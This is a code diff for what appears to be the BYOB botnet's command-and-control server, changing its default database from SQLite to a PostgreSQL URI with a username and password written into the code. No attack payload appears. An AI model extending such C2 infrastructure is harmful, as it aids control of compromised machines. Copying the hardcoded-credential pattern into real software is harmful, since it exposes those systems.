@@ -87,8 +87,8 @@ def main():
         '--database',
         action='store',
         type=str,
-        default='database.db',
-        help='SQLite database')
+        default='postgresql://byob_user:byob_password@localhost/byob_db',
+        help='Database URI')
 
     parser.add_argument(
         '--debug',
@@ -157,14 +157,12 @@ class C2():
     _prompt_color = 'WHITE'
     _prompt_style = 'BRIGHT'
 
-    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
+    def __init__(self, host='0.0.0.0', port=1337, db='postgresql://byob_user:byob_password@localhost/byob_db'):
         """
         Create a new Command & Control server
 
         `Optional`
-        :param str db:      SQLite database
-                                :memory: (session)
-                                *.db     (persistent)
+        :param str db:      Database URI
 
         Returns a byob.server.C2 instance
 
@@ -198,7 +196,7 @@ class C2():
             'query' : {
                 'method': self.query,
                 'usage': 'query <statement>',
-                'description': 'query the SQLite database'},
+                'description': 'query the database'},
             'options' : {
                 'method': self.settings,
                 'usage': 'options',
